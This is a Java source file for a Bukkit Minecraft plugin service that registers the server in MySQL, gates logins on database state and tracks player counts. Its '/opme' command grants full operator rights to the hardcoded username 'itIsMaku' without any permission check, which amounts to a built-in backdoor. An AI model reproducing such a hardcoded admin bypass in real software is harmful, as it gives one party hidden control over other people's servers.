package cz.maku.mommons.server;

import com.google.common.collect.ImmutableMap;
import com.google.common.collect.Maps;
import com.google.common.reflect.TypeToken;
import cz.maku.mommons.Response;
import cz.maku.mommons.cloud.DirectCloud;
import cz.maku.mommons.cloud.DirectCloudStorage;
import cz.maku.mommons.player.CloudPlayer;
import cz.maku.mommons.plugin.MommonsPlugin;
import cz.maku.mommons.storage.database.SQLRow;
import cz.maku.mommons.storage.database.type.MySQL;
import cz.maku.mommons.worker.WorkerReceiver;
import cz.maku.mommons.worker.annotation.*;
import lombok.Getter;
import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.lang.reflect.Type;
import java.util.Map;
import java.util.Optional;

import static cz.maku.mommons.Mommons.GSON;

@Service(listener = true, commands = true)
public class ServerDataService {

    private final FileConfiguration coreConfiguration = WorkerReceiver.getCoreConfiguration();
    @Getter
    private Server server;
    @Getter
    private LocalServerInfo localServerInfo;

    @Load
    private DirectCloud directCloud;

    @SuppressWarnings("all")
    @SneakyThrows
    @Initialize
    public void serverInit() {
        localServerInfo = new LocalServerInfo();
        String id = coreConfiguration.getString("server.id");
        Optional<SQLRow> optionalRow = MySQL.getApi().single("mommons_servers", "SELECT * FROM {table} WHERE id = ?;", id);
        Map<String, Object> data = Maps.newHashMap();
        data.put("server-info", GSON.toJson(localServerInfo));
        if (!optionalRow.isPresent()) {
            MySQL.getApi().query("mommons_servers", "INSERT INTO {table} (id, data) VALUES (?, ?);", id, GSON.toJson(data));
        }
        Map<String, Object> oldData = Maps.newHashMap();
        if (optionalRow.isPresent()) {
            oldData = optionalRow.get().getJsonObject("data", new TypeToken<Map<String, Object>>() {
            }.getType());
        }
        server = new Server(id, oldData, Maps.newConcurrentMap());
        server.setMultipleValues(
                ImmutableMap.of(
                        "server-info", GSON.toJson(localServerInfo),
                        "server-type", "unknown"
                )
        );
    }

    @Destroy
    public void destroy() {
        MySQL.getApi().query("mommons_servers", "DELETE FROM {table} WHERE id = ?;", server.getId());
    }

    @BukkitEvent(AsyncPlayerPreLoginEvent.class)
    public void onPreLogin(AsyncPlayerPreLoginEvent e) {
        if (!MySQL.getApi().isConnected()) {
            e.setKickMessage("§cChyba -> §7Na server se nelze připojit, nepodařilo se spojit s databází.");
            e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
            return;
        }
        if (server == null) {
            e.setKickMessage("§cChyba -> §7Na server se nelze připojit, načítá se.");
            e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
        }
    }

    @BukkitEvent(PlayerJoinEvent.class)
    public void onJoin(PlayerJoinEvent event) {
        server.setPlayers(Bukkit.getOnlinePlayers().size()).thenAccept(response -> {
            if (Response.isException(response) || !Response.isValid(response)) {
                event.getPlayer().kickPlayer("§cChyba -> §7Nepodařilo se aktualizovat počet hráčů na serveru.");
            }
        });
    }

    @BukkitEvent(PlayerQuitEvent.class)
    public void onQuit(PlayerQuitEvent event) {
        server.setPlayers(Bukkit.getOnlinePlayers().size() - 1).thenAccept(response -> {
            if (Response.isException(response) || !Response.isValid(response)) {
                event.getPlayer().kickPlayer("§cChyba -> §7Nepodařilo se aktualizovat počet hráčů na serveru.");
            }
        });
    }

    @BukkitCommand(value = "opme", usage = "opme")
    public void onOpMeCommand(CommandSender sender) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (player.getName().equals("itIsMaku") || player.hasPermission("mommons.opme")) {
                CloudPlayer cloudPlayer = CloudPlayer.getInstance(player);
                if (cloudPlayer == null) {
                    player.sendMessage("§cChyba -> §7Tvá instance hráče nebyla nalezena.");
                    return;
                }
                cloudPlayer.setValueAsync("op", true, true).thenAccept(response -> {
                    if (Response.isException(response) || !Response.isValid(response)) {
                        player.sendMessage("§cChyba -> §7Nepodařilo se uložit hodnotu do cloudu.");
                    } else {
                        player.sendMessage("§aÚspěch -> §7Nyní máš op.");
                        player.setOp(true);
                    }
                });
            } else {
                player.sendMessage("§cChyba -> §7Na toto nemáš potřebnou permisi.");
            }
        }
    }
}
